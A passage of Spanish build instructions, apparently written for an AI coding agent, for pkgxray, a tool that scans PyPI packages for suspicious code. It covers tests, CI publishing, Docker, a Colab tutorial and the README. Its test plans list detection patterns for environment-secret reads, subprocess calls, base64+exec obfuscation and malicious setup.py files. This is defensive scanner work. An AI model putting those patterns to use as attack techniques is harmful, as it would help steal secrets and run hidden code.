# REPITE este patrón para TODOS los analizadores:
# - test_network.py: probar import socket, requests.get(), código limpio
# - test_filesystem.py: probar open() write, os.remove, paths sensibles, código limpio
# - test_env_access.py: probar os.environ, os.getenv, variables sensibles, código limpio
# - test_subprocess.py: probar subprocess.run, os.system, import subprocess, código limpio
# - test_obfuscation.py: probar base64+exec, hex strings, código limpio
# - test_setup_scripts.py: probar setup.py malicioso vs limpio
# - test_dynamic_imports.py: probar __import__, importlib, código limpio

# --- tests/test_downloader.py ---
# - test_get_package_info_valid: probar con "requests" (paquete conocido)
# - test_get_package_info_invalid: probar con "paquete-que-no-existe-xyz123" → PackageNotFoundError
# - test_find_best_distribution: probar que encuentra una URL
# NOTA: estos tests hacen requests reales a PyPI. Está bien para un proyecto académico.

# --- tests/test_extractor.py ---
# - Crear un .tar.gz temporal con archivos .py de prueba
# - Verificar que extract_python_files retorna los archivos correctos
# - Verificar que is_setup=True para setup.py

# --- tests/test_scanner.py ---
# - test_scan_known_package: escanear "requests" y verificar que retorna un ScanResult válido
# - test_scan_result_structure: verificar que el ScanResult tiene todos los campos
# NOTA: este test es lento porque descarga un paquete real. Marcarlo con @pytest.mark.slow

# git commit -m "test: add comprehensive test suite"

# ============================================================================
# FASE 11: GITHUB ACTIONS CI/CD
# ============================================================================

# Archivo: .github/workflows/publish.yml
# Este workflow corre los tests y publica a PyPI cuando se crea un tag.

# ```yaml
# name: Test and Publish
#
# on:
#   push:
#     branches: [main]
#     tags: ["v*"]
#   pull_request:
#     branches: [main]
#
# jobs:
#   test:
#     runs-on: ubuntu-latest
#     strategy:
#       matrix:
#         python-version: ["3.9", "3.11", "3.12"]
#     steps:
#       - uses: actions/checkout@v4
#       - name: Set up Python ${{ matrix.python-version }}
#         uses: actions/setup-python@v5
#         with:
#           python-version: ${{ matrix.python-version }}
#       - name: Install dependencies
#         run: |
#           python -m pip install --upgrade pip
#           pip install -e ".[dev]"
#       - name: Run tests
#         run: pytest tests/ -v --tb=short
#
#   publish:
#     needs: test
#     runs-on: ubuntu-latest
#     if: startsWith(github.ref, 'refs/tags/v')
#     permissions:
#       id-token: write
#     steps:
#       - uses: actions/checkout@v4
#       - name: Set up Python
#         uses: actions/setup-python@v5
#         with:
#           python-version: "3.12"
#       - name: Install build tools
#         run: pip install build twine
#       - name: Build package
#         run: python -m build
#       - name: Publish to PyPI
#         env:
#           TWINE_USERNAME: __token__
#           TWINE_PASSWORD: ${{ secrets.PYPI_API_TOKEN }}
#         run: twine upload dist/*
# ```

# git commit -m "ci: add GitHub Actions workflow for testing and publishing"

# ============================================================================
# FASE 12: DOCKERFILE Y DOCKER-COMPOSE
# ============================================================================

# --- Dockerfile ---
# ```dockerfile
# FROM python:3.11-slim
#
# LABEL maintainer="pkgxray contributors"
# LABEL description="Analyze PyPI packages for suspicious behavior"
#
# WORKDIR /app
#
# # Copiar archivos de proyecto
# COPY pyproject.toml README.md LICENSE ./
# COPY src/ src/
#
# # Instalar el paquete
# RUN pip install --no-cache-dir .
#
# # Instalar dependencias de test
# RUN pip install --no-cache-dir pytest pytest-cov
#
# # Copiar tests
# COPY tests/ tests/
#
# ENTRYPOINT ["pkgxray"]
# CMD ["--help"]
# ```

# --- docker-compose.yml ---
# ```yaml
# version: "3.8"
#
# services:
#   test:
#     build: .
#     entrypoint: ["pytest"]
#     command: ["tests/", "-v", "--tb=short"]
#
#   scan:
#     build: .
#     entrypoint: ["pkgxray"]
#     command: ["scan", "requests"]
#
#   scan-json:
#     build: .
#     entrypoint: ["pkgxray"]
#     command: ["scan", "requests", "--format", "json"]
# ```

# Uso:
#   docker-compose run test        → corre todos los tests
#   docker-compose run scan        → escanea "requests" en terminal
#   docker-compose run scan-json   → escanea "requests" en JSON

# git commit -m "feat: add Docker support with Dockerfile and docker-compose"

# ============================================================================
# FASE 13: NOTEBOOK TUTORIAL PARA GOOGLE COLAB
# ============================================================================

# Archivo: notebooks/pkgxray_tutorial.ipynb
# IMPORTANTE: Debe ser un archivo .ipynb válido (formato JSON de Jupyter).

# Estructura del notebook (cada item es una celda):

# CELDA 1 (Markdown):
# # 🔬 pkgxray Tutorial
# ## Analiza paquetes de PyPI antes de instalarlos
# Este notebook demuestra cómo usar pkgxray para detectar comportamiento
# sospechoso en paquetes Python.

# CELDA 2 (Code):
# !pip install pkgxray

# CELDA 3 (Markdown):
# ## ¿Qué es pkgxray?
# Cuando haces `pip install un-paquete`, confías en que ese código no va a:
# - Robar tus variables de entorno (API keys, tokens)
# - Abrir conexiones de red ocultas
# - Ejecutar código arbitrario
# - Leer archivos sensibles de tu sistema
#
# pkgxray descarga el paquete **sin instalarlo**, analiza el código fuente,
# y te dice qué patrones sospechosos encontró.

# CELDA 4 (Markdown):
# ## 1. Uso básico desde la línea de comandos

# CELDA 5 (Code):
# !pkgxray scan requests

# CELDA 6 (Markdown):
# ## 2. Uso desde Python (API)

# CELDA 7 (Code):
# from pkgxray import scan
#
# result = scan("requests")
# print(f"Paquete: {result.package_name}")
# print(f"Versión: {result.version}")
# print(f"Score de riesgo: {result.risk_score}/100")
# print(f"Nivel de riesgo: {result.risk_level}")
# print(f"Archivos analizados: {result.files_analyzed}")
# print(f"Hallazgos totales: {len(result.findings)}")

# CELDA 8 (Markdown):
# ## 3. Explorando los hallazgos en detalle

# CELDA 9 (Code):
# for finding in result.findings[:10]:  # primeros 10
#     print(f"[{finding.severity.value.upper()}] {finding.analyzer_name}")
#     print(f"  Archivo: {finding.filename}:{finding.line_number}")
#     print(f"  Descripción: {finding.description}")
#     print(f"  Código: {finding.code_snippet[:100]}")
#     print()

# CELDA 10 (Markdown):
# ## 4. Generar reporte en JSON

# CELDA 11 (Code):
# from pkgxray.reporter import generate_report
#
# json_report = generate_report(result, format="json")
# print(json_report[:2000])  # primeros 2000 chars

# CELDA 12 (Markdown):
# ## 5. Escanear otro paquete y comparar

# CELDA 13 (Code):
# result2 = scan("flask")
# print(f"flask - Score: {result2.risk_score}/100 ({result2.risk_level})")
# print(f"flask - Hallazgos: {len(result2.findings)}")
# print()
# print(f"requests - Score: {result.risk_score}/100 ({result.risk_level})")
# print(f"requests - Hallazgos: {len(result.findings)}")

# CELDA 14 (Markdown):
# ## 6. Resumen y análisis por tipo de hallazgo

# CELDA 15 (Code):
# from collections import Counter
#
# analyzer_counts = Counter(f.analyzer_name for f in result.findings)
# severity_counts = Counter(f.severity.value for f in result.findings)
#
# print("Hallazgos por analizador:")
# for name, count in analyzer_counts.most_common():
#     print(f"  {name}: {count}")
#
# print("\nHallazgos por severidad:")
# for sev, count in severity_counts.most_common():
#     print(f"  {sev}: {count}")

# CELDA 16 (Markdown):
# ## 7. Generar reporte HTML

# CELDA 17 (Code):
# html_report = generate_report(result, format="html")
# from IPython.display import HTML, display
# display(HTML(html_report))

# CELDA 18 (Markdown):
# ## Conclusión
# pkgxray te permite auditar paquetes de PyPI antes de instalarlos,
# detectando patrones como ejecución dinámica de código, conexiones de red,
# acceso a variables de entorno, y más.
#
# ### Recursos
# - [GitHub Repository](https://github.com/TU_USUARIO/pkgxray)
# - [PyPI Package](https://pypi.org/project/pkgxray/)
# - `pip install pkgxray`

# NOTA PARA CLAUDE CODE: Genera el .ipynb como JSON válido de Jupyter.
# Cada celda debe tener cell_type ("markdown" o "code"), source (lista de strings),
# y metadata apropiada. El notebook debe abrir sin errores en Google Colab.

# git commit -m "docs: add Google Colab tutorial notebook"

# ============================================================================
# FASE 14: README.md COMPLETO
# ============================================================================

# El README.md debe contener EXACTAMENTE esta estructura:

# 1. BADGES (al inicio):
#    - Badge de PyPI version: ![PyPI](https://img.shields.io/pypi/v/pkgxray)
#    - Badge de Python versions: ![Python](https://img.shields.io/pypi/pyversions/pkgxray)
#    - Badge de License: ![License](https://img.shields.io/pypi/l/pkgxray)
#    - Badge de Open in Colab (OBLIGATORIO):
#      [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/TU_USUARIO/pkgxray/blob/main/notebooks/pkgxray_tutorial.ipynb)

# 2. TÍTULO Y DESCRIPCIÓN:
#    # 🔬 pkgxray
#    **Analyze PyPI packages for suspicious behavior before installing them.**
#    (una descripción de 2-3 líneas del problema que resuelve)

# 3. FEATURES (qué detecta):
#    Lista de los 8 tipos de análisis con emojis

# 4. INSTALLATION:
#    pip install pkgxray

# 5. QUICK START (CLI):
#    pkgxray scan <paquete>
#    pkgxray scan <paquete> --format json
#    pkgxray scan <paquete> -o report.html --format html

# 6. PYTHON API:
#    Ejemplo de uso con from pkgxray import scan

# 7. DOCKER:
#    docker-compose run scan
#    docker-compose run test

# 8. HOW IT WORKS:
#    Breve explicación del flujo (download → extract → analyze → score → report)

# 9. ANALYZERS:
#    Tabla con nombre, descripción, severidad de cada analizador

# 10. DEVELOPMENT:
#     Cómo clonar, instalar en modo dev, y correr tests

# 11. LICENSE: MIT

# git commit -m "docs: add comprehensive README with badges and Colab link"

# ============================================================================
# FASE 15: VERIFICACIÓN FINAL
# ============================================================================

# Ejecutar estas verificaciones al final:

# 1. Correr TODOS los tests:
#    pytest tests/ -v

# 2. Verificar que el paquete se construye:
#    python -m build
#    (debe crear dist/pkgxray-0.1.0.tar.gz y dist/pkgxray-0.1.0-py3-none-any.whl)

# 3. Verificar que la CLI funciona:
#    pip install -e .
#    pkgxray --help
#    pkgxray scan requests

# 4. Verificar que el Docker funciona:
#    docker build -t pkgxray .
#    docker run pkgxray scan requests

# 5. Verificar que el notebook es un .ipynb válido:
#    python -c "import json; json.load(open('notebooks/pkgxray_tutorial.ipynb'))"

# 6. Commit final:
#    git add .
#    git commit -m "chore: final verification - all tests pass"

# ============================================================================
# RESUMEN DE TODOS LOS COMMITS (en orden):
# ============================================================================
# 1.  chore: initial project structure
# 2.  feat: add base data models and abstract analyzer
# 3.  feat: implement PyPI package downloader
# 4.  feat: implement archive extractor for tar.gz and whl files
# 5.  feat: implement all 8 security analyzers
# 6.  feat: implement risk scoring system
# 7.  feat: implement main scanner orchestrator
# 8.  feat: implement terminal, JSON, and HTML reporters
# 9.  feat: implement CLI with click
# 10. feat: configure public API exports
# 11. test: add comprehensive test suite
# 12. ci: add GitHub Actions workflow for testing and publishing
# 13. feat: add Docker support with Dockerfile and docker-compose
# 14. docs: add Google Colab tutorial notebook
# 15. docs: add comprehensive README with badges and Colab link
# 16. chore: final verification - all tests pass
# ============================================================================
# FIN DE INSTRUCCIONES. CONSTRUYE TODO.
# ============================================================================
